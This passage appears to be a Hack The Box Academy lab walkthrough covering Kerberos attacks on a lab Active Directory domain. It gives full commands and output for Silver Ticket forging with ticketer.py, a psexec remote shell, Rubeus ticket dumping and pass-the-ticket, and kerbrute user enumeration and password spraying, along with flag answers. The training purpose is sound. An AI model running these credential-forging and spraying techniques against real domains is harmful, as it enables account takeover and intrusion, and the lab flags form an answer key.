Golden ticket for 'Administrator @ inlanefreight.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!
```

At last, when reading the contents of the file `\\sql01.inlanefreight.local\C$\Users\Administrator\Documents\silverflag.txt`, students will attain the flag `S1lV3r_Tickets_Ar3_fUn_4_P3rs1sTent`:

Code: powershell

```powershell
more \\sql01.inlanefreight.local\C$\Users\Administrator\Documents\silverflag.txt
```

```
PS C:\Tools> more \\sql01.inlanefreight.local\C$\Users\Administrator\Documents\silverflag.txt

S1lV3r_Tickets_Ar3_fUn_4_P3rs1sTent
```

Answer: `S1lV3r_Tickets_Ar3_fUn_4_P3rs1sTent`

# Silver Ticket from Linux

## Question 1

### "DC01$'s NTLM hash is 542780725df68d3456a0672f59001987. Using a Silver Ticket, what is the content of C:\\Users\\Administrator\\Videos\\silverticket.txt on this host?"

After spawning the target machine, students first need to create an entry for it in `/etc/hosts` with the domain name `inlanefreight.local` and `DC01.inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local DC01.inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-pofdwtjunw]─[~]
└──╼ $sudo sh -c 'echo "10.129.88.85 inlanefreight.local DC01.inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to use [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) to retrieve the domain's SID, to find it to be `S-1-5-21-1870146311-1183348186-593267556`:

Code: shell

```shell
lookupsid.py inlanefreight.local/'htb-student:HTB_@cademy_stdnt!'@dc01.inlanefreight.local -domain-sids
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $lookupsid.py inlanefreight.local/'htb-student:HTB_@cademy_stdnt!'@dc01.inlanefreight.local -domain-sids

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Brute forcing SIDs at dc01.inlanefreight.local
[*] StringBinding ncacn_np:dc01.inlanefreight.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1870146311-1183348186-593267556
<SNIP>
```

With the SID and the NTLM hash of `DC01$` (`542780725df68d3456a0672f59001987`) known for the domain `inlanefreight.local`, students need to use [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) to forge a `Silver Ticket` that impersonates the user `Administrator` to access the filesystem of `DC01`:

Code: shell

```shell
ticketer.py -nthash 542780725df68d3456a0672f59001987 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local -spn CIFS/DC01.inlanefreight.local Administrator
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $ticketer.py -nthash 542780725df68d3456a0672f59001987 -domain-sid S-1-5-21-1870146311-1183348186-593267556 -domain inlanefreight.local -spn CIFS/DC01.inlanefreight.local Administrator

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for inlanefreight.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Subsequently, students need to import the ticket attained `Administrator.ccache` by setting its path to the environment variable `KRB5CCNAME`:

Code: shell

```shell
export KRB5CCNAME=./Administrator.ccache
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $export KRB5CCNAME=Administrator.ccache
```

Students then need to use [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) to get a remote shell on `DC01` as `Administrator`:

Code: shell

```shell
psexec.py -k -no-pass dc01.inlanefreight.local
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $psexec.py -k -no-pass dc01.inlanefreight.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on dc01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file jyVpbvRg.exe
[*] Opening SVCManager on dc01.inlanefreight.local.....
[*] Creating service yafl on dc01.inlanefreight.local.....
[*] Starting service yafl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

At last, when reading the contents of the file `C:\Users\Administrator\Videos\silverticket.txt`, students will attain the flag `M0rE_S1lV3r_Tickets`:

Code: cmd

```cmd
more C:\Users\Administrator\Videos\silverticket.txt
```

```
C:\Windows\system32> more C:\Users\Administrator\Videos\silverticket.txt

M0rE_S1lV3r_Tickets
```

Answer: `M0rE_S1lV3r_Tickets`

# Pass-the-Ticket

## Question 1

### "Extract the ticket for the user jefferson.matts and use it to connect to the DC01 and read the flag located at C:\\Users\\jefferson.matts\\Downloads\\ptt.txt"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:STMIP /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.132.218 /dynamic-resolution

[14:20:00:700] [5888:5889] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[14:20:00:700] [5888:5889] [WARN][com.freerdp.crypto] - CN = WS01.INLANEFREIGHT.LOCAL
[14:20:00:701] [5888:5889] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:20:00:701] [5888:5889] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[14:20:00:701] [5888:5889] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:20:00:701] [5888:5889] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.132.218:3389) 
[14:20:00:701] [5888:5889] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[14:20:00:701] [5888:5889] [ERROR][com.freerdp.crypto] - Common Name (CN):
[14:20:00:701] [5888:5889] [ERROR][com.freerdp.crypto] - 	WS01.INLANEFREIGHT.LOCAL
[14:20:00:701] [5888:5889] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.132.218:3389 (RDP-Server):
	Common Name: WS01.INLANEFREIGHT.LOCAL
	Subject:     CN = WS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = WS01.INLANEFREIGHT.LOCAL
	Thumbprint:  56:5c:fd:bc:9f:35:08:24:c2:b1:9e:89:4d:86:02:cc:3b:c6:c8:d2:7a:48:d3:e3:21:56:9f:de:f7:19:2d:25
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, in a privileged `PowerShell` session, students need to navigate to `C:\Tools\` and use the [triage](https://github.com/GhostPack/Rubeus#triage) action of `Rubeus` to get the `LUID` of `jefferson.matts`, to find it to be `0x187c9a`:

Code: powershell

```powershell
.\Rubeus.exe triage
```

```
PS C:\Tools> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x6b2a2

 -------------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                              | Service                                           | EndTime              |
 -------------------------------------------------------------------------------------------------------------------------------
 | 0x187c9a | jefferson.matts @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 4/28/2023 6:50:59 PM |
 | 0x6b2a2  | htb-student @ INLANEFREIGHT.LOCAL     | krbtgt/INLANEFREIGHT.LOCAL                        | 4/28/2023 6:20:08 PM |
 | 0x6b2a2  | htb-student @ INLANEFREIGHT.LOCAL     | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 4/28/2023 6:20:08 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | krbtgt/INLANEFREIGHT.LOCAL                        | 4/28/2023 6:18:45 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | cifs/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 4/28/2023 6:18:45 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | WS01$                                             | 4/28/2023 6:18:45 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | LDAP/DC01.INLANEFREIGHT.LOCAL                     | 4/28/2023 6:18:45 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 4/28/2023 6:18:45 PM |
 | 0x3e4    | ws01$ @ INLANEFREIGHT.LOCAL           | krbtgt/INLANEFREIGHT.LOCAL                        | 4/28/2023 6:19:10 PM |
 | 0x3e4    | ws01$ @ INLANEFREIGHT.LOCAL           | ldap/dc01.inlanefreight.local/INLANEFREIGHT.LOCAL | 4/28/2023 6:19:10 PM |
 | 0x3e4    | ws01$ @ INLANEFREIGHT.LOCAL           | cifs/DC01.INLANEFREIGHT.LOCAL                     | 4/28/2023 6:19:10 PM |
 -------------------------------------------------------------------------------------------------------------------------------
```

Subsequently, students need to extract the TGT of `jefferson.matts` using the [dump](https://github.com/GhostPack/Rubeus#dump) action of `Rubeus`:

Code: powershell

```powershell
.\Rubeus.exe dump /luid:0x187c9a /service:krbtgt /nowrap
```

```
PS C:\Tools> .\Rubeus.exe dump /luid:0x187c9a /service:krbtgt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x187c9a
[*] Current LUID    : 0x6b2a2

  UserName                 : jefferson.matts
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x187c9a
  UserSID                  : S-1-5-21-1870146311-1183348186-593267556-1131
  AuthenticationPackage    : Kerberos
  LogonType                : Batch
  LogonTime                : 4/28/2023 8:50:59 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
  UserPrincipalName        : jefferson.matts@INLANEFREIGHT.LOCAL

    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  jefferson.matts
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  4/28/2023 8:50:59 AM
    EndTime                  :  4/28/2023 6:50:59 PM
    RenewTill                :  5/5/2023 8:50:59 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  G/ScqKa4RUOcII/z+BacveAnCuR+g56emcMUqd4knBE=
    Base64EncodedTicket   :

      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
```

With the attained TGT of `jefferson.matts` signed by `KRBTGT`'s secret key, students need to use the [createnetonly](https://github.com/GhostPack/Rubeus#createnetonly) action of `Rubeus` to create a `sacrificial process`, specifying `C:\Windows\System32\cmd.exe` for the `/program` parameter:

Code: powershell

```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

```
PS C:\Tools> .\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username        : KGEMF2ZA
[*] Domain          : Y0KWE244
[*] Password        : GMQHPS4S
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5364
[+] LUID            : 0x1a828c
```

Subsequently, within the new CMD session, students need to use the [renew](https://github.com/GhostPack/Rubeus#renew) action of `Rubeus` to request a new TGT for `jefferson.matts` using the TGT previously attained by the `dump` action:

Code: cmd

```cmd
Rubeus.exe renew /ticket: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 /ptt
```

```
C:\Tools>Rubeus.exe renew /ticket:doIGSzCCBkegAwIBBaEDAgEWooIFMzCCBS9hggUrMIIFJ6ADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSR<SNIP> /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\jefferson.matts'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIGSzCCBkegAwIBBaEDAgEWooIFMzCCBS9hggUrMIIFJ6ADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      <SNIP>
[+] Ticket successfully imported!
```

At last, when reading the contents of the file `\\dc01.inlanefreight.local\c$\Users\jefferson.matts\Downloads\ptt.txt`, students will attain the flag `P4SS_Th3_T1ckEt_IsFUN`:

Code: cmd

```cmd
more \\dc01.inlanefreight.local\c$\Users\jefferson.matts\Downloads\ptt.txt
```

```
C:\Tools>more \\dc01.inlanefreight.local\c$\Users\jefferson.matts\Downloads\ptt.txt

P4SS_Th3_T1ckEt_IsFUN
```

Answer: `P4SS_Th3_T1ckEt_IsFUN`

# Account Enumeration & Password Spraying with Kerberos

## Question 1

### "What user, among the given list, is a valid domain user? (Answer format: firstname.lastname)"

After spawning the target machine, students first need to download [usernamelist.zip](https://academy.hackthebox.com/storage/modules/25/usernamelist.zip) and unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/25/usernamelist.zip && unzip usernamelist.zip 
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $wget https://academy.hackthebox.com/storage/modules/25/usernamelist.zip && unzip usernamelist.zip 

--2023-04-28 15:14:24--  https://academy.hackthebox.com/storage/modules/25/usernamelist.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Then, students need to create an entry for the spawned target machine in `/etc/hosts` with the domain name `inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

Subsequently, using the `userenum` command, students need to use `kerbrute` to enumerate the domain `inlanefreight.local` for a valid username; students will find that `adam.jones` is a valid username:

Code: shell

```shell
kerbrute userenum usernamelist.txt --dc STMIP -d inlanefreight.local
```

Code: sesion

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $kerbrute userenum usernamelist.txt --dc 10.129.150.255 -d inlanefreight.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/28/23 - Ronnie Flathers @ropnop

2023/04/28 15:21:43 >  Using KDC(s):
2023/04/28 15:21:43 >  	10.129.150.255:88

2023/04/28 15:21:43 >  [+] VALID USERNAME:	 adam.jones@inlanefreight.local
2023/04/28 15:21:43 >  Done! Tested 209 usernames (1 valid) in 0.071 seconds
```

Answer: `adam.jones`

# Account Enumeration & Password Spraying with Kerberos

## Question 2

### "What user, among the given list, has the password HTBRocks! (Answer format: firstname.lastname)"

After spawning the target machine, students first need to download [domainuserlist.zip](https://academy.hackthebox.com/storage/modules/25/domainuserlist.zip) and unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/25/domainuserlist.zip && unzip domainuserlist.zip
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $wget https://academy.hackthebox.com/storage/modules/25/domainuserlist.zip && unzip domainuserlist.zip

--2023-04-28 15:23:01--  https://academy.hackthebox.com/storage/modules/25/domainuserlist.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Then, students need to create an entry for the spawned target machine in `/etc/hosts` with the domain name `inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

Subsequently, using the `passwordspray` command, students need to use `kerbrute` to perform a password spray attack against the domain `inlanefreight.local` with the password `HTBRocks!`; students will find that `matilda.kens` username has the password `HTBRocks!`:

Code: shell

```shell
kerbrute userenum usernamelist.txt --dc STMIP -d inlanefreight.local
```

Code: sesion

```
┌─[htb-ac-413848@htb-iozi1h3tmt]─[~]
└──╼ $ kerbrute passwordspray domainuserlist.txt 'HTBRocks!' --dc 10.129.150.255 -d inlanefreight.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/28/23 - Ronnie Flathers @ropnop

2023/04/28 15:26:08 >  Using KDC(s):
2023/04/28 15:26:08 >  	10.129.150.255:88

2023/04/28 15:26:08 >  [+] VALID LOGIN:	 matilda.kens@inlanefreight.local:HTBRocks!
2023/04/28 15:26:08 >  Done! Tested 23 logins (1 successes) in 0.062 seconds
```

Answer: `matilda.kens`

# Skills Assessment

## Question 1

### "Using the provided users.txt list, try to get access to the domain. What's the name of the user whose credentials or hash you found?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:STMIP /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-aijozfzklp]─[~]
└──╼ $xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.23.122 /dynamic-resolution

[18:03:49:261] [2799:2800] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
<SNIP>
```

Subsequently, students need to start enumerating the network `172.16.8.0/24`; when running `fping`, students will find three hosts alive, `172.16.8.3/24`, `172.16.8.35/24`, and `172.16.8.114/24`:

Code: shell

```shell
fping -asgq 172.16.8.0/24
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $fping -asgq 172.16.8.0/24

172.16.8.3
172.16.8.35
172.16.8.114

     254 targets
       3 alive
     251 unreachable
       0 unknown addresses

    1004 timeouts (waiting for response)
    1007 ICMP Echos sent
       3 ICMP Echo Replies received
    1004 other ICMP received

 0.071 ms (min round trip time)
 0.323 ms (avg round trip time)
 0.471 ms (max round trip time)
        9.717 sec (elapsed real time)
```

Students then need to run an `nmap` scan against the alive hosts, finding the domain controller at `172.16.8.3/24` and `SERVER01` at `172.16.8.35/24`:

Code: shell

```shell
sudo nmap -A -Pn 172.16.8.3 172.16.8.35 172.16.8.114
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo nmap -A -Pn 172.16.8.3 172.16.8.35 172.16.8.114

Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-10 08:19 EST
Nmap scan report for INLANEFREIGHT.LOCAL (172.16.8.3)
Host is up (0.0034s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-10 13:20:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 00:50:56:B9:41:ED (VMware)
